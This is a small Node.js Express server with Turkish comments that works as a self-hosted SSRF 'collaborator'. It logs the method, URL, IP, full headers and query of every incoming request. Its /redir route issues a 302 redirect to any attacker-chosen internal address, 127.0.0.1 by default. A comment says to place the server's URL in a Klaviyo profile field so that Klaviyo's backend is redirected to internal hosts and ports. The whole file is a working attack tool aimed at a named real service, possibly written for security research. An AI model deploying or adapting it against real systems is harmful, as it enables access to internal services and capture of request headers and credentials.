const express = require('express');
const app = express();

app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// 1. Loglama ve İnceleme Rotası
app.use((req, res, next) => {
    console.log('--- YENİ İSTEK GELDİ ---');
    console.log('Method:', req.method);
    console.log('URL:', req.url);
    console.log('IP:', req.ip || req.headers['x-forwarded-for']);
    console.log('Headers:', req.headers);
    console.log('Query:', req.query);
    console.log('------------------------');
    next();
});

// 2. SSRF / Redirect Tetikleme Rotası
// Kullanım: Klaviyo profilindeki URL'ye şunu yazacaksın: 
// https://collab-fv3u.onrender.com/redir?target=http://127.0.0.1:8080/
app.get('/redir', (req, res) => {
    const target = req.query.target || 'http://127.0.0.1/';
    console.log(`[!] Redirect tetiklendi! Hedef: ${target}`);
    
    // 302 Found ile hedef iç adrese veya porta fırlatıyoruz
    return res.redirect(302, target);
});

// 3. Varsayılan Yanıt
app.use((req, res) => {
    return res.status(200).send("Collaborator success");
});

app.listen(3000, () => console.log("Gelişmiş Collaborator 3000 portunda devrede!"));
